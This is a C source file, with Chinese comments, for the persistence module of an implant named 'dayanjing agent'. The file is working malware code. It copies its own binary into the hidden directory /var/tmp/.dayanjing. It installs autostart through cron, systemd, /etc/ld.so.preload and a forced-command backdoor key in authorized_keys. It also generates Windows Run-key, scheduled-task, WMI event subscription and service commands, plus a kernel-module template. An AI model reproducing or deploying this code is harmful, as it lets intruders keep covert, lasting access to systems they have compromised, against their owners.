#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define MARKER "# dayanjing-agent-persist"

/* ---------- generate（文本载荷，不写盘） ---------- */
static size_t gen_cron(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap, "@reboot %s\n", arg ? arg : "true");
}
static size_t gen_systemd(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "[Unit]\nDescription=dayanjing agent\n\n[Service]\nExecStart=%s\n"
        "Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n",
        arg ? arg : "/bin/true");
}
static size_t gen_launchagent(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n"
        "  <string>com.dayanjing.agent</string>\n"
        "  <key>ProgramArguments</key>\n  <array>\n    <string>/bin/sh</string>\n"
        "    <string>-c</string>\n    <string>%s</string>\n  </array>\n"
        "  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\n",
        arg ? arg : "true");
}
static size_t gen_ldpreload(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap, "%s\n", arg ? arg : "/tmp/.agent.so");
}
/* 要写入 authorized_keys 的完整公钥行（<type> <base64> [comment]）。
 *
 * 为什么必须是"整行"而不是只传 blob：
 *   类型前缀（ssh-rsa / ssh-ed25519 / ecdsa-sha2-*）与 base64 blob 必须匹配，
 *   写死 "ssh-rsa " 前缀去接一个 ed25519 blob 会让 OpenSSH 拒绝整行 ——
 *   表现为"驻留装上了、看起来成功、但永远登不进去"，比不装更糟：
 *   消耗一次写入动作、留下痕迹、零收益。
 *
 * 为什么未设置时拒绝生成（返回 0）而不是回落占位 key：
 *   占位 key 无法认证，等价于上述失败模式，且更难排查。
 *
 * 单线程假设：implant 内无并发调用。 */
static char g_ssh_pub[1024];

int persist_sshkey_pubkey(const char *line)
{
    size_t i, n;
    if (!line) return -1;
    n = strlen(line);
    if (n == 0 || n >= sizeof g_ssh_pub) return -1;
    /* 必须单行：多行会把后续内容变成 authorized_keys 的独立条目 */
    if (strchr(line, '\n') || strchr(line, '\r')) return -1;
    /* 必须带类型前缀，且与 blob 之间有空格 */
    if (strncmp(line, "ssh-", 4) != 0 &&
        strncmp(line, "ecdsa-", 6) != 0 &&
        strncmp(line, "sk-",   3) != 0) return -1;
    if (!strchr(line, ' ')) return -1;
    for (i = 0; i < n; i++)
        if (line[i] < 0x20 || line[i] > 0x7e) return -1;
    memcpy(g_ssh_pub, line, n + 1);
    return 0;
}

static size_t gen_sshkey(const char *arg, char *out, size_t cap) {
    /* 未注入真实公钥 -> 拒绝生成，绝不写入无法认证的占位 key */
    if (!g_ssh_pub[0]) return 0;
    /* forced command 含引号/换行会破坏 authorized_keys 语法，
     * 后果是整行失效甚至影响该用户其它合法条目 */
    if (arg && (strchr(arg, '"') || strchr(arg, '\n') || strchr(arg, '\r')))
        return 0;
    return (size_t)snprintf(out, cap, "command=\"%s\" %s\n",
                            arg ? arg : "true", g_ssh_pub);
}
static size_t gen_registry(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "/v DayanjingAgent /t REG_SZ /d \"%s\" /f", arg ? arg : "agent.exe");
}
static size_t gen_schtask(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "schtasks /create /tn DayanjingAgent /tr \"%s\" /sc onlogon /f",
        arg ? arg : "agent.exe");
}
static size_t gen_wmi(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "powershell -nop -c \"$f=Set-WmiInstance -Class __EventFilter "
        "-Namespace root/subscription -Arguments @{Name='dj';Query='SELECT * FROM __InstanceModificationEvent "
        "WITHIN 60 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'};"
        "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription "
        "-Arguments @{Name='dj';CommandLineTemplate='%s'};"
        "Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}\"",
        arg ? arg : "agent.exe");
}
static size_t gen_service(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "sc create DayanjingAgent binPath= \"%s\" start= auto",
        arg ? arg : "agent.exe");
}
static size_t gen_lkm(const char *arg, char *out, size_t cap) {
    (void)arg;
    return (size_t)snprintf(out, cap,
        "# <kernel module> 见 persist_kernel_source()，需目标机内核头编译，"
        "沙盒内 UNVERIFIED_KERNEL");
}

static const persist_desc_t descs[] = {
    { PERSIST_CRON,        "cron",         PERSIST_PLAT_NIX, gen_cron },
    { PERSIST_SYSTEMD,     "systemd",      PERSIST_PLAT_NIX, gen_systemd },
    { PERSIST_LAUNCHAGENT, "launchagent",  PERSIST_PLAT_ANY, gen_launchagent },
    { PERSIST_LDPRELOAD,   "ld_preload",   PERSIST_PLAT_NIX, gen_ldpreload },
    { PERSIST_SSHKEY,      "ssh_key",      PERSIST_PLAT_NIX, gen_sshkey },
    { PERSIST_REGISTRY,    "registry_run", PERSIST_PLAT_WIN, gen_registry },
    { PERSIST_SCHTASK,     "schtask",      PERSIST_PLAT_WIN, gen_schtask },
    { PERSIST_WMI,         "wmi_event",    PERSIST_PLAT_WIN, gen_wmi },
    { PERSIST_SERVICE,     "win_service",  PERSIST_PLAT_WIN, gen_service },
    { PERSIST_LKM,         "lkm",          3,                gen_lkm },
};

size_t persist_method_count(void) { return sizeof descs / sizeof descs[0]; }
const persist_desc_t *persist_method_at(size_t i) {
    return (i < persist_method_count()) ? &descs[i] : NULL;
}

static const persist_desc_t *find_desc(persist_method_t m) {
    for (size_t i = 0; i < persist_method_count(); i++)
        if (descs[i].id == m) return &descs[i];
    return NULL;
}

size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t cap) {
    const persist_desc_t *d = find_desc(m);
    if (!d || !out || cap == 0) return 0;
    int n = (int)d->generate(arg, out, cap);
    if (n < 0 || (size_t)n >= cap) return 0;
    return (size_t)n;
}

/* ---------- 路径助手：真实系统路径（可挂 root_prefix） ---------- */
static int artifact_path(persist_method_t m, const char *root_prefix,
                         char *out, size_t cap, int *needs_marker)
{
    const char *rp   = root_prefix ? root_prefix : "";
    const char *home = getenv("HOME");
    if (!home || !*home) home = "/root";
    switch (m) {
        case PERSIST_SYSTEMD:
            snprintf(out, cap, "%s/etc/systemd/system/dayanjing.service", rp);
            if (needs_marker) *needs_marker = 0;
            return 0;
        case PERSIST_CRON:
            snprintf(out, cap, "%s/etc/cron.d/dayanjing", rp);
            if (needs_marker) *needs_marker = 0;
            return 0;
        case PERSIST_SSHKEY:
            snprintf(out, cap, "%s%s/.ssh/authorized_keys", rp, home);
            if (needs_marker) *needs_marker = 1;
            return 0;
        case PERSIST_LDPRELOAD:
            snprintf(out, cap, "%s/etc/ld.so.preload", rp);
            if (needs_marker) *needs_marker = 0;
            return 0;
        default:
            return -2;   /* Windows / 非文件型 */
    }
}

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[512];
    size_t len = strlen(path);
    if (len == 0 || len >= sizeof tmp) return -1;
    memcpy(tmp, path, len + 1);
    for (size_t i = 1; i < len; i++) {
        if (tmp[i] == '/') {
            tmp[i] = '\0';
            if (mkdir(tmp, mode) != 0 && errno != EEXIST) return -1;
            tmp[i] = '/';
        }
    }
    if (mkdir(tmp, mode) != 0 && errno != EEXIST) return -1;
    return 0;
}

static int write_file(const char *path, const char *data, size_t len) {
    char parent[512];
    snprintf(parent, sizeof parent, "%s", path);
    char *slash = strrchr(parent, '/');
    if (slash) { *slash = '\0'; if (mkdir_p(parent, 0755) != 0) return -1; }
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    size_t w = fwrite(data, 1, len, f);
    fclose(f);
    return (w == len) ? 0 : -1;
}

/* 追加 marker + line；若已含 marker 则不动（幂等） */
static int append_marker_line(const char *path, const char *marker, const char *line) {
    /* 已存在则不重复追加 */
    FILE *fr = fopen(path, "r");
    if (fr) {
        char buf[8192]; size_t n = fread(buf, 1, sizeof buf - 1, fr);
        fclose(fr); buf[n] = '\0';
        if (strstr(buf, marker)) return 0;
    }
    /* 建父目录 */
    char parent[512];
    snprintf(parent, sizeof parent, "%s", path);
    char *slash = strrchr(parent, '/');
    if (slash) { *slash = '\0'; mkdir_p(parent, 0700); }
    FILE *f = fopen(path, "a");
    if (!f) return -1;
    /* line 自带换行且已含 marker：整行可被 filter 移除，不留孤儿 key 行 */
    int ok = (fprintf(f, "%s", line) > 0);
    fclose(f);
    return ok ? 0 : -1;
}

/* 删除所有含 marker 的行（保留文件本身与其它内容） */
static int filter_out_marker(const char *path, const char *marker) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;                 /* 不存在视为已清理 */
    char buf[65536]; size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f);
    if (n == 0) return 0;
    buf[n] = '\0';
    if (!strstr(buf, marker)) return 0;
    /* 逐行重建 */
    FILE *out = fopen(path, "w");
    if (!out) return -1;
    char *save = NULL;
    for (char *ln = strtok_r(buf, "\n", &save); ln; ln = strtok_r(NULL, "\n", &save)) {
        if (strstr(ln, marker)) continue;
        fprintf(out, "%s\n", ln);
    }
    fclose(out);
    return 0;
}

/* ---------- install / uninstall（真实路径） ---------- */
int persist_install(persist_method_t m, const char *root_prefix, const char *arg) {
    if (!find_desc(m)) return -1;
    char path[512]; int needs_marker = 0;
    if (artifact_path(m, root_prefix, path, sizeof path, &needs_marker) != 0)
        return -2;                                   /* 平台不支持 */
    if (!arg) arg = "/bin/true";

    if (m == PERSIST_SSHKEY) {
        char line[1024];
        size_t n = persist_generate(m, arg, line, sizeof line);
        if (n == 0) return -1;
        /* 去掉生成文本尾部换行，把 marker 拼进同一行：
         * 卸载按 marker 整行移除，不会留下孤儿 forced-command key。 */
        while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = '\0';
        char full[1200];
        snprintf(full, sizeof full, "%s %s\n", line, MARKER);
        return append_marker_line(path, MARKER, full);
    }

    char buf[4096];
    size_t n = persist_generate(m, arg, buf, sizeof buf);
    if (n == 0) return -1;
    if (write_file(path, buf, n) != 0) return -1;

    /* systemd：写 unit 后建立 wants 符号链接（等价于 systemctl enable） */
    if (m == PERSIST_SYSTEMD) {
        const char *rp = root_prefix ? root_prefix : "";
        char wants[640], link[768];
        snprintf(wants, sizeof wants, "%s/etc/systemd/system/multi-user.target.wants", rp);
        snprintf(link,  sizeof link,  "%s/dayanjing.service", wants);
        if (mkdir_p(wants, 0755) != 0) return -1;
        if (symlink(path, link) != 0 && errno != EEXIST) return -1;
    }
    return 0;
}

int persist_uninstall(persist_method_t m, const char *root_prefix, const char *arg) {
    (void)arg;
    if (!find_desc(m)) return -1;
    char path[512]; int needs_marker = 0;
    if (artifact_path(m, root_prefix, path, sizeof path, &needs_marker) != 0)
        return -2;
    struct stat st;
    if (m == PERSIST_SSHKEY) return filter_out_marker(path, MARKER);
    if (m == PERSIST_SYSTEMD) {
        const char *rp = root_prefix ? root_prefix : "";
        char link[640];
        snprintf(link, sizeof link,
                 "%s/etc/systemd/system/multi-user.target.wants/dayanjing.service", rp);
        unlink(link);
    }
    if (stat(path, &st) != 0) return 0;               /* 已清理 */
    return (unlink(path) == 0) ? 0 : -1;
}

/* ---------- 查询 / 枚举（真实路径） ---------- */
int persist_installed(const char *root_prefix, persist_method_t m) {
    if (!find_desc(m)) return -1;
    char path[512]; int needs_marker = 0;
    if (artifact_path(m, root_prefix, path, sizeof path, &needs_marker) != 0)
        return -1;                                    /* 非文件型 */
    struct stat st;
    if (stat(path, &st) != 0) return 0;
    if (!needs_marker) return 1;
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char buf[65536]; size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f); buf[n] = '\0';
    return strstr(buf, MARKER) ? 1 : 0;
}

int persist_enumerate(const char *root_prefix, persist_cb_t cb, void *ud) {
    if (!cb) return -1;
    int hits = 0;
    for (int m = 0; m <= (int)PERSIST_LKM; m++) {
        const persist_desc_t *d = find_desc((persist_method_t)m);
        if (!d) continue;
        char path[512]; int needs_marker = 0;
        if (artifact_path((persist_method_t)m, root_prefix, path, sizeof path, &needs_marker) != 0)
            continue;
        if (persist_installed(root_prefix, (persist_method_t)m) == 1) {
            cb((persist_method_t)m, d->name, path, ud);
            hits++;
        }
    }
    return hits;
}

/* ---------- 落盘自身 ---------- */
int persist_drop_self(const char *root_prefix, const char *dir,
                      char *out_path, size_t cap)
{
    FILE *src = fopen("/proc/self/exe", "rb");
    if (!src) return -1;
    if (fseek(src, 0, SEEK_END) != 0) { fclose(src); return -1; }
    long sz = ftell(src);
    if (sz <= 0) { fclose(src); return -1; }
    rewind(src);
    char *buf = malloc((size_t)sz);
    if (!buf) { fclose(src); return -1; }
    size_t rd = fread(buf, 1, (size_t)sz, src);
    fclose(src);
    if (rd != (size_t)sz) { free(buf); return -1; }

    const char *rp = root_prefix ? root_prefix : "";
    int n = snprintf(out_path, cap, "%s%s/agent", rp, dir ? dir : "/var/tmp/.dayanjing");
    if (n < 0 || (size_t)n >= cap) { free(buf); return -1; }

    char dpath[512];
    snprintf(dpath, sizeof dpath, "%s%s", rp, dir ? dir : "/var/tmp/.dayanjing");
    if (mkdir_p(dpath, 0700) != 0) { free(buf); return -1; }

    FILE *dst = fopen(out_path, "wb");
    if (!dst) { free(buf); return -1; }
    size_t wr = fwrite(buf, 1, (size_t)sz, dst);
    fclose(dst);
    free(buf);
    if (wr != (size_t)sz) return -1;
    chmod(out_path, 0755);
    return 0;
}

/* ---------- 确保驻留 ---------- */
int persist_linux_ensure(const char *root_prefix,
                         char *out_bin_path, size_t cap,
                         int *out_methods, size_t nm_methods)
{
    static const persist_method_t ms[] = { PERSIST_SYSTEMD, PERSIST_CRON, PERSIST_SSHKEY };
    const size_t nms = sizeof ms / sizeof ms[0];

    int already = 0;
    for (size_t i = 0; i < nms; i++)
        if (persist_installed(root_prefix, ms[i]) == 1) already++;

    /* 落盘自身（覆盖写，幂等）；已驻留时也刷新，保证路径上的副本是最新的 */
    if (persist_drop_self(root_prefix, "/var/tmp/.dayanjing", out_bin_path, cap) != 0)
        return -1;

    int newly = 0;
    for (size_t i = 0; i < nms; i++) {
        if (persist_installed(root_prefix, ms[i]) == 1) {
            if (out_methods && i < nm_methods) out_methods[i] = 1;
            continue;
        }
        if (persist_install(ms[i], root_prefix, out_bin_path) == 0) {
            newly++;
            if (out_methods && i < nm_methods) out_methods[i] = 1;
        } else if (out_methods && i < nm_methods) {
            out_methods[i] = 0;
        }
    }
    if (already == (int)nms) return 1;
    return (newly > 0) ? 0 : -1;
}

int persist_linux_query(const char *root_prefix,
                        int *out_methods, size_t nm_methods)
{
    static const persist_method_t ms[] = { PERSIST_SYSTEMD, PERSIST_CRON, PERSIST_SSHKEY };
    const size_t nms = sizeof ms / sizeof ms[0];
    int cnt = 0;
    for (size_t i = 0; i < nms; i++) {
        int s = persist_installed(root_prefix, ms[i]);
        if (out_methods && i < nm_methods) out_methods[i] = (s == 1) ? 1 : 0;
        if (s == 1) cnt++;
    }
    return cnt;
}

const char *persist_kernel_source(void) {
    static const char *src =
        "/* dayanjing_lkm.c — 内核级持久化模板（UNVERIFIED_KERNEL）\n"
        " * 需目标机内核头文件编译：make -C /lib/modules/$(uname -r)/build M=$(pwd) modules\n"
        " * 沙盒无内核头，此处仅作交付源码，不做编译验证。 */\n"
        "#include <linux/module.h>\n"
        "#include <linux/kernel.h>\n"
        "#include <linux/init.h>\n"
        "static int __init dj_init(void) { printk(KERN_INFO \"dayanjing lkm loaded\\n\"); return 0; }\n"
        "static void __exit dj_exit(void) { printk(KERN_INFO \"dayanjing lkm unloaded\\n\"); }\n"
        "module_init(dj_init);\nmodule_exit(dj_exit);\n"
        "MODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"dayanjing\");\n";
    return src;
}
